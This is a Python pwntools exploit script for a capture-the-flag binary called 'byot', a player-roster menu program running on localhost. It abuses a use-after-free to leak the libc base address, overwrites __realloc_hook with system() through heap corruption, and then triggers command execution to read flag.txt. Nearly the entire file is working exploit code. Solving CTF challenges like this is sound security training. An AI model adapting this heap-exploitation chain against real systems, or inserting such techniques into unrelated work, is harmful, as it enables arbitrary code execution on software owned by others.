#!/usr/bin/env python3

from pwn import *

exe = ELF("byot_patched")
libc = ELF("libc-2.24.so")
ld = ELF("ld-2.24.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 4000)

    return r

def show_player(r: process):
    r.sendlineafter("enter your choice:", b"2")
    r.recvuntil("Name:")
    name   = r.recvuntil("- Pwn:")
    pwn    = r.recvuntil("- Crypto:")
    crypto = r.recvuntil("- Web:")
    web    = r.recvuntil("- Stegoguess:")
    steg   = r.recvuntil("-===")
    return (
        name, pwn, crypto, web, steg
    )

def select_player(r: process, index):
    r.sendlineafter("enter your choice:", b"3")
    r.sendlineafter("like to select:", str(index).encode())

def create_player(r: process, name, pwn_score, crypto_score, web_score, guess_score):
    r.sendlineafter("enter your choice:", b"4")
    r.sendlineafter("player name:", name)
    r.sendlineafter("skillz [1-999]:", str(pwn_score).encode())
    r.sendlineafter("skillz [1-999]:", str(crypto_score).encode())
    r.sendlineafter("skillz [1-999]:", str(web_score).encode())
    r.sendlineafter("skillz [1-999]:", str(guess_score).encode())

def remove_player(r: process, index):
    r.sendlineafter("enter your choice:", b"5")
    r.sendlineafter("would like to remove:", str(index).encode())

def remove_all_players(r: process):
    for x in range(10):
        remove_player(r, x)

def set_name_player(r: process, name):
    r.sendlineafter("enter your choice:", b"6")
    r.sendlineafter("enter your choice:", b"1")
    r.sendlineafter("selected player:", name)
    log.info(r.recvuntil("enter your choice:"))
    r.sendline(b"6")

def leak_libc(r: process):
    create_player(r, b"a"*0x80, 0, 0, 0, 0)
    create_player(r, b"a"*0x80, 0, 0, 0, 0)
    select_player(r, 0)
    remove_player(r, 0)
    return int.from_bytes(show_player(r)[0][1:7], "little") - 0x399b58

def write_realloc_hook(r: process, libc_address):
    create_player(r, b"a"*80, 0, 0, 0, 0)
    create_player(r, b"a"*80, 0, 0, 0, 0)
    create_player(r, b"a"*80, 0, 0, 0, 0)
    select_player(r, 0)
    remove_player(r, 0)
    remove_player(r, 1)
    realloc_hook_address = (libc_address + 0x399ae8).to_bytes(6, "little")
    create_player(r, b"a"*0x10 + realloc_hook_address, 0, 0, 0, 0)
    system = (libc_address + 0x3f480).to_bytes(6, "little")
    set_name_player(r, system)

def trigger_realloc_hook(r: process, command):
    create_player(r, command, 0, 0, 0, 0)
    select_player(r, 0)
    set_name_player(r, b"a"*(len(command)*2))

def main():
    r = conn()

    libc_base = leak_libc(r)
    log.info(f"Libc address leaked: {hex(libc_base)}")

    remove_all_players(r)
    write_realloc_hook(r, libc_base)
    log.info(f"Realloc hook overwrited")
    remove_all_players(r)
    trigger_realloc_hook(r, b"cat flag.txt")

    r.interactive()

if __name__ == "__main__":
    main()